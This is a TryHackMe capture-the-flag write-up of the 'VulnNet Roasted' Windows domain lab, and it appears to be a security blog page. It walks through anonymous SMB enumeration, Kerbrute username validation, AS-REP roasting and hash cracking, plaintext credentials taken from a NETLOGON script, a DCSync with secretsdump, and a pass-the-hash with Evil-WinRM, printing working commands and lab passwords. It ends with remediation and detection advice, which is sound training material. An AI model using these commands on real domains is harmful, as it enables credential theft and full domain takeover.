---
layout: default
title: "TryHackMe - VulnNet Roasted"
---

# TryHackMe - VulnNet Roasted

**OS:** Windows (Active Directory)

VulnNet Roasted is a Windows domain controller with anonymously readable SMB shares. Documents in those shares contain full names, which are used to generate a username list. Kerbrute confirms valid accounts, ASREPRoasting cracks `t-skid`'s hash, and SMB access with those credentials surfaces a VBScript in NETLOGON with plaintext credentials for `a-whitehat`. That account is a Domain Admin - `secretsdump` pulls all hashes and a pass-the-hash gives interactive access as Administrator.

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Target | `<target-ip> / domain controller` |
| Initial Access | AS-REP roasting to crack a domain credential |
| Privilege Escalation | DCSync rights abuse and pass-the-hash to Administrator |
| Final Access | Domain Administrator / full domain compromise |

---

## Attack Path

1. Recon identified the exposed services and separated useful attack surface from noise.
2. The first break was AS-REP roasting to crack a domain credential.
3. Post-exploitation enumeration exposed DCSync rights abuse and pass-the-hash to Administrator.
4. The final privileged context was reached and the required proof was captured.

---

## Recon

### Anonymous SMB and Username Generation

LDAP enumeration via Nmap found the domain `vulnnet-rst.local`. Two SMB shares were readable without credentials:

```
VulnNet-Business-Anonymous  READ ONLY
  Business-Manager.txt
  Business-Sections.txt
  Business-Tracking.txt

VulnNet-Enterprise-Anonymous  READ ONLY
  Enterprise-Operations.txt
  Enterprise-Safety.txt
  Enterprise-Sync.txt
```

The documents contained references to full names. These were extracted into `names.txt` and a custom username generation script ([Ru57y5hck3lfrd/username-generator](https://github.com/Ru57y5hck3lfrd/username-generator)) produced common username format variations, saved as `usernames.txt`.

### Kerbrute and ASREPRoasting

Kerbrute's `userenum` validated four accounts against the DC:

```
/opt/kerbrute/kerbrute_linux_386 userenum -d vulnnet-rst.local --dc <target-ip> usernames.txt

[+] VALID USERNAME: a-whitehat@vulnnet-rst.local
[+] VALID USERNAME: j-goldenhand@vulnnet-rst.local
[+] VALID USERNAME: t-skid@vulnnet-rst.local
[+] VALID USERNAME: j-leet@vulnnet-rst.local
```

`impacket-GetNPUsers` found `t-skid` had pre-authentication disabled:

```
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:<redacted-32-hex>$...
```

John cracked it:

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep.hash

tj072889*   ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
```

---

## Initial Access

### NETLOGON Script with Plaintext Credentials

With `t-skid`'s credentials, SMB access included the `NETLOGON` share. Spidering it with CrackMapExec found `ResetPassword.vbs`, a VBScript containing hardcoded plaintext credentials:

```vbs
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

CrackMapExec confirmed the credentials were valid and that `a-whitehat` was a Domain Admin (`Pwn3d!`):

```
crackmapexec smb -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' -d vulnnet-rst.local <target-ip>
[+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
```

PsExec failed (likely due to AV or SMB write restrictions), but `impacket-wmiexec` worked:

```
impacket-wmiexec vulnnet-rst.local/a-whitehat@<target-ip>
C:\>whoami
vulnnet-rst\a-whitehat
```

---

## Privilege Escalation

### DCSync and Pass-the-Hash

Despite being a Domain Admin, `a-whitehat` couldn't read `system.txt` directly. `secretsdump` ran a DCSync to dump all domain hashes:

```
impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@<target-ip>

Administrator:500:<redacted-32-hex>:<redacted-nt-hash>:::
```

A pass-the-hash attack with Evil-WinRM using the Administrator's NTLM hash gave the final interactive session:

```
evil-winrm -u administrator -H <redacted-nt-hash> -i <target-ip>

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
vulnnet-rst\administrator
```

---

## Summary

VulnNet Roasted covers the full Kerberos attack chain: anonymous SMB enumeration into name generation, user validation, ASREPRoasting, and credential pivoting through a NETLOGON script. Storing credential reset scripts with plaintext passwords in NETLOGON is a real enterprise pattern that turns a low-privilege SMB read into Domain Admin.

**Key takeaway:** NETLOGON scripts with embedded credentials are a frequent finding in AD environments - they were often written years ago for automation that no one revisited, and they grant access to whatever account's credentials they store.

---

## Root Cause

The demonstrated path worked because Kerberos pre-authentication disabled on a crackable account, excessive replication rights, hardcoded credentials in distributed code, anonymous access to sensitive data or write paths gave the attacker a bridge from reconnaissance to execution. The important pattern is the chain: AS-REP roasting to crack a domain credential created a foothold, and DCSync rights abuse and pass-the-hash to Administrator converted that foothold into Domain Administrator / full domain compromise.

## Impact

Successful exploitation reached Domain Administrator / full domain compromise. That level of access allows command execution, proof or sensitive-file access, credential collection, and a realistic path to additional systems if the same credentials, services, or trust relationships exist elsewhere.

## Remediation

- Remove or harden the specific exposure used for initial access: AS-REP roasting to crack a domain credential.
- Fix the privilege boundary that enabled escalation: DCSync rights abuse and pass-the-hash to Administrator.
- Audit AD privileges with BloodHound/PowerView and remove nonessential tier-0 rights.
- Rotate credentials observed or replayed during the chain and search for reuse on adjacent systems.
- Validate the fix by safely replaying the enumeration steps that originally exposed the weakness.

## Detection Opportunities

- Alert on exploit attempts or suspicious access patterns against the service that enabled initial access.
- Correlate successful authentication, new process creation, and privilege-boundary events after enumeration activity.
- Monitor for the specific escalation signal: DCSync rights abuse and pass-the-hash to Administrator.
- Collect and review Kerberos, LDAP, certificate, and directory-replication events for nonstandard principals.

## Lessons Learned

- The winning path was not just a vulnerable service; it was the connection between AS-REP roasting to crack a domain credential and DCSync rights abuse and pass-the-hash to Administrator.
- Preserve the observations that explain why each pivot made sense, not only the commands that worked.
- Write remediation from the root cause of each step so the report reads like an operator narrative and a defender action plan.
